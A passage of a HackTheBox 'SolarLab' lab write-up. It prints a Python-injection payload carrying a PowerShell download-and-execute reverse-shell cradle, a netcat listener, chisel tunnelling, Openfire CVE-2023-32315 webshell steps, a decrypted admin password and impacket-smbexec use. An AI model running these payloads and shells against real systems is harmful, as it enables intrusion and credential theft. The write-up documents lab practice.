&#x27;red&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/form.png" alt="alt text"></p><p>Attempting to send the exploit through the form field<br>throws an error in your face indicating that the character limit for the form was exceeded.</p><p>one way to solve this would be to try and shorten the length of every variable, or to try different parameters<br>after intercepting with burp and trying different areas,<br>placing the exploit under <code>training_request</code> Drop list option bypasses this restriction.<br><img src="/../images/solarlab/burp.png" alt="alt text"></p><h2 id="Blake-shell"><a href="#Blake-shell" class="headerlink" title="Blake shell"></a>Blake shell</h2><p>after confirming the connection it’s time to get a shell!<br>this part involves these steps:</p><ul><li>setup python server hosting the shell:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 http.server 80   <span class="comment">#revshell.ps1 is in the same directory</span></span><br></pre></td></tr></table></figure><ul><li>set up a listening session on a separate tab:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; (<span class="built_in">stty</span> size; <span class="built_in">cat</span>) | nc -lvnp PORT</span><br></pre></td></tr></table></figure><ul><li>This Piece of code is used to download and execute powershell script in memory, were going to add it to the Exploit Code</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span>(<span class="built_in">IWR</span> http://<span class="number">10.10</span>.<span class="number">16.14</span>/con.ps1 <span class="literal">-UseBasicParsing</span>); <span class="built_in">Invoke-ConPtyShell</span> <span class="number">10.10</span>.<span class="number">16.63</span> <span class="number">9001</span></span><br></pre></td></tr></table></figure><h4 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit:"></a>Final Exploit:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))</span></span></span><br><span class="line"><span class="string"><span class="tag">[&#x27;os&#x27;].system(&#x27;powershell IEX(IWR http://10.10.16.14/con.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.16.63 9001&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1,</span></span></span><br><span class="line"><span class="string"><span class="tag"> &#x27;startswith&#x27;: lambda self,</span></span></span><br><span class="line"><span class="string"><span class="tag">  x: 1 == 0,</span></span></span><br><span class="line"><span class="string"><span class="tag">   &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">    self.mutated - 1) &#125;,</span></span></span><br><span class="line"><span class="string"><span class="tag">     &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;,</span></span></span><br><span class="line"><span class="string"><span class="tag">      ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>sending in the repaeter tab, i got a 503 from the web server<br> and a powershell session as the blake user.<br> <img src="/../images/solarlab/rev1.png" alt="alt text"></p><h2 id="Initial-Foothold"><a href="#Initial-Foothold" class="headerlink" title="Initial Foothold"></a>Initial Foothold</h2><p>the user flag was found under <code>C:\Users\blake\Desktop\flag.txt</code></p><p>checking <code>Users</code> folder, i found <code>openfire</code>, <code>Administrator</code>, and <code>blake</code>(me).</p><p>getting winpeas</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://10.10.16.97/winPEASany.exe&quot; -OutFile </span><br><span class="line">&quot;C:\Users\blake\Desktop\winpeas.exe&quot;</span><br></pre></td></tr></table></figure><p>Found openfire service Running running a web protal locally on port 9090.<br><img src="/../images/solarlab/listneingport.png" alt="alt text"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Openfire(Openfire)[&quot;C:\Program Files\Openfire\bin\openfire-service.exe&quot;] - Autoload</span><br></pre></td></tr></table></figure><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Openfire is a real-time collaboration (RTC) server licensed under the Open Source Apache License.<br>I tried to get into <code>C:\Program Files\Openfire\</code> to look for scripts&#x2F;DBs but it was resricted to openfire only.</p><h3 id="Openfire-Web-Server"><a href="#Openfire-Web-Server" class="headerlink" title="Openfire Web Server"></a>Openfire Web Server</h3><p>port forwarding with chisel so i can interact with local server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\chisel.exe client 10.10.16.14:4321 R:9090:127.0.0.1:9090   #on-victim</span><br><span class="line">chisel server --socks5 --reverse -p 4321                     #on-attacker</span><br></pre></td></tr></table></figure><p>Navigating to localhost:9090<br><img src="/../images/solarlab/openfire.png" alt="alt text"></p><h3 id="Exploring-CVE-2023-32315"><a href="#Exploring-CVE-2023-32315" class="headerlink" title="Exploring CVE-2023-32315"></a>Exploring CVE-2023-32315</h3><p>trying default credentials did not work.<br>searching for “openfire exploit” reveals Openfire  is vulnerable to a Path traversal where attackers can abuse the vulneralbility in order to obtain CSRF tokens and cookies for Administrative accounts to generate an account that they can log onto.<br><img src="/../images/solarlab/0_5wf7vTHNYoj8z4hy.webp" alt="alt text"></p><p>Read more:<a href="https://vsociety.medium.com/cve-2023-32315-path-traversal-in-openfire-leads-to-rce-10f988e06236">https://vsociety.medium.com/cve-2023-32315-path-traversal-in-openfire-leads-to-rce-10f988e06236</a></p><h3 id="Shell-as-Openfire"><a href="#Shell-as-Openfire" class="headerlink" title="Shell as Openfire"></a>Shell as Openfire</h3><p>searching for “openfire exploit”<br> <a href="https://github.com/miko550/CVE-2023-32315#step">https://github.com/miko550/CVE-2023-32315#step</a><br>This exploit aims to generate a new user with <code>CVE-2023-32315</code> and perform RCE through a bundled Malicious Plugin.<br>  steps to perform:</p><ol><li>Run exploit</li><li>login with newly added user </li><li>go to tab plugin &gt; upload plugin <code>openfire-management-tool-plugin.jar</code></li><li>go to tab server &gt; server settings &gt; Management tool  </li><li>Access webshell with password “123”</li></ol><p><img src="/../images/solarlab/cve2.png" alt="alt text"><br>login with the newly added user:<br><img src="/../images/solarlab/openfirelogin.png" alt="alt text"><br>follow the other steps to upload the plugin<br> go to tab plugin &gt; upload plugin <code>openfire-management-tool-plugin.jar</code><br><img src="/../images/solarlab/plugin.png" alt="alt text"></p><p>go to tab server &gt; server settings &gt; Management tool<br>Access webshell with password “123”</p><p>get powershell as openfire with the same technique:<br><img src="/../images/solarlab/powershell-1.png" alt="alt text"></p><h2 id="SQL-Analysis"><a href="#SQL-Analysis" class="headerlink" title="SQL Analysis"></a>SQL Analysis</h2><p>With the newly obtained privilege I can now access <code>\Openfire\</code><br>Found scripts related to DB in <code>/openfire/embedded-db</code>, discovered <code>openfire.script</code>. Searching for <code>CREATE</code> and <code>INSERT</code> queries:<br>I found some queries related to users.<br>the query Underneath shows the schema for Creating the <code>OFUSER</code> table, which is responsible for holding user credentials. </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> MEMORY <span class="keyword">TABLE</span> PUBLIC.OFUSER(USERNAME <span class="type">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT NULL</span>,STOREDKEY <span class="type">VARCHAR</span>(<span class="number">32</span>),SERVERKEY <span class="type">VARCHAR</span>(<span class="number">32</span>),SALT <span class="type">VARCHAR</span>(<span class="number">32</span>),</span><br><span class="line">ITERATIONS <span class="type">INTEGER</span>,</span><br><span class="line"></span><br><span class="line">PLAINPASSWORD <span class="type">VARCHAR</span>(<span class="number">32</span>),ENCRYPTEDPASSWORD <span class="type">VARCHAR</span>(<span class="number">255</span>),</span><br><span class="line"></span><br><span class="line">NAME <span class="type">VARCHAR</span>(<span class="number">100</span>)</span><br><span class="line">,EMAIL <span class="type">VARCHAR</span>(<span class="number">100</span>),CREATIONDATE <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">NOT NULL</span>,MODIFICATIONDATE <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">NOT NULL</span>,<span class="keyword">CONSTRAINT</span> OFUSER_PK <span class="keyword">PRIMARY KEY</span>(USERNAME))</span><br></pre></td></tr></table></figure><p>Some queries for adding users were also found. The query for creating an admin account was of particular interest to me.<br><img src="/../images/solarlab/OFUSER.png" alt="alt text"><br>format:<br>name,<br><code>key</code>,<br>serverkey,<br> salt,<br><code>plaintext password</code>,<br> <code>encrypted password</code><br> ….The rest. Looks like encryption was used instead of hashing.<br> Unlike hashing, Eencryption does not require a function or algorithm, google up ways to decrypt openfire passwords.<br><img src="/../images/solarlab/google-dcrypt.png" alt="alt text"><br> checked both github repos to discover key name,<br>Column  <code>passwordkey</code> in the  <code>OFPROPERTY</code> table was found. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type .\openfire.script | findstr &quot;OFPROPERTY&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/insert.png" alt="alt text"><br><img src="/image.png" alt="alt text"></p><p>So now i can leverage my findings to get the administrator’s password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Encrypted-pass:</span><br><span class="line">becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac</span><br><span class="line">62d4e89b2856b0289b365f3069802e59d442</span><br><span class="line">*Key:</span><br><span class="line">hGXiFzsKaAeYLjn  </span><br></pre></td></tr></table></figure><p>I cloned the tool from the  second repo and ran:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -&lt;encrypted-password&gt; &lt;key&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/java-cve.png" alt="alt text"></p><p>We found it!:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThisPasswordShouldDo!@ </span><br></pre></td></tr></table></figure><h2 id="SYSTEM-SHELL"><a href="#SYSTEM-SHELL" class="headerlink" title="SYSTEM SHELL"></a>SYSTEM SHELL</h2><p>let’s now login to administrator with the PW:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec administrator:<span class="string">&#x27;&lt;pw&gt;&#x27;</span>@&lt;victim-ip</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/SYSTEMXD.png" alt="alt text"><br>root flag was found under<br> <code>Administrator\Desktop\root.txt</code>.</p><p> That’s all, Thank you :)</p>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> nmap </tag>
            
            <tag> HTB </tag>
            
            <tag> smb </tag>
            
            <tag> windows </tag>
            
            <tag> flask </tag>
            
            <tag> privilege escalation </tag>
            
            <tag> openfire </tag>
            
            <tag> chisel </tag>
            
            <tag> password-spray </tag>
            
            <tag> htb solarlab </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
